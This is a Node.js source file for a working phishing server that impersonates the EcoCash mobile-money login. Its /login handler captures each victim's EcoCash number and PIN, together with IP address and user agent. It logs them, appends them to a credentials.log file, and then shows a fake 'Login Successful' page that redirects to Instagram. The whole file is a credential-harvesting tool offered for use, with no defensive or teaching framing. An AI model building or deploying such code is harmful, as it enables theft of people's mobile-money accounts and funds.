const http = require('http');
const fs = require('fs');
const path = require('path');
const url = require('url');

const PORT = process.env.PORT || 8000;

// Create server
http.createServer((req, res) => {
    const parsedUrl = url.parse(req.url, true);
    const pathname = parsedUrl.pathname;

    console.log(`[${new Date().toISOString()}] ${req.method} ${req.url}`);

    // Serve the HTML file for GET requests to root
    if (req.method === 'GET' && pathname === '/') {
        console.log('Serving HTML page');
        fs.readFile(path.join(__dirname, 'index.html'), (err, data) => {
            if (err) {
                res.writeHead(500, { 'Content-Type': 'text/plain' });
                res.end('Error loading index.html');
                return;
            }
            res.writeHead(200, { 'Content-Type': 'text/html' });
            res.end(data);
        });
        return;
    }

    // Handle login POST requests
    if (req.method === 'POST' && pathname === '/login') {
        console.log('Processing login request');
        let body = '';
        
        req.on('data', chunk => {
            body += chunk.toString();
        });
        
        req.on('end', () => {
            console.log('Raw form data:', body);
            
            try {
                const data = new URLSearchParams(body);
                const credentials = {
                    ecocashNumber: data.get('ecocashNumber'),
                    ecocashPin: data.get('ecocashPin'),
                    timestamp: new Date().toISOString(),
                    userAgent: req.headers['user-agent'],
                    ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress
                };
                
                console.log('Captured credentials:', credentials);
                
                // Save to file
                fs.appendFile('credentials.log', JSON.stringify(credentials) + '\n', (err) => {
                    if (err) {
                        console.error('Error writing to file:', err);
                    } else {
                        console.log('✅ Credentials saved to credentials.log');
                    }
                });
                
                // Send success HTML page with redirect
                res.writeHead(200, { 'Content-Type': 'text/html' });
                res.end(`
                    <!DOCTYPE html>
                    <html>
                    <head>
                        <title>Login Successful</title>
                        <style>
                            body { 
                                font-family: Arial, sans-serif; 
                                display: flex; 
                                justify-content: center; 
                                align-items: center; 
                                height: 100vh; 
                                background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
                                margin: 0;
                            }
                            .success-container {
                                background: white;
                                padding: 40px;
                                border-radius: 10px;
                                box-shadow: 0 10px 30px rgba(0,0,0,0.1);
                                text-align: center;
                            }
                            .success-icon {
                                font-size: 60px;
                                color: #4CAF50;
                                margin-bottom: 20px;
                            }
                            h2 { color: #333; margin-bottom: 15px; }
                            p { color: #666; }
                        </style>
                    </head>
                    <body>
                        <div class="success-container">
                            <div class="success-icon">✓</div>
                            <h2>Login Successful!</h2>
                            <p>Redirecting to your account...</p>
                            <script>
                                setTimeout(function() {
                                    window.location.href = 'https://www.instagram.com/reels/DHB000zJIwe';
                                }, 2000);
                            </script>
                        </div>
                    </body>
                    </html>
                `);
                
            } catch (error) {
                console.error('Error processing request:', error);
                res.writeHead(500, { 'Content-Type': 'text/plain' });
                res.end('Server error');
            }
        });
        return;
    }

    // Handle GET requests to /login - show a message
    if (req.method === 'GET' && pathname === '/login') {
        res.writeHead(200, { 'Content-Type': 'text/html' });
        res.end(`
            <!DOCTYPE html>
            <html>
            <head><title>EcoCash Login</title></head>
            <body>
                <h1>EcoCash Login</h1>
                <p>Please use the <a href="/">login form</a> to access your account.</p>
            </body>
            </html>
        `);
        return;
    }

    // Handle other routes
    res.writeHead(404, { 'Content-Type': 'text/html' });
    res.end(`
        <!DOCTYPE html>
        <html>
        <head><title>404 Not Found</title></head>
        <body>
            <h1>404 - Page Not Found</h1>
            <p>Return to <a href="/">EcoCash Login</a></p>
        </body>
        </html>
    `);
}).listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`📝 Access the login page at: http://localhost:${PORT}`);
    console.log(`📁 Credentials will be saved to: credentials.log`);
});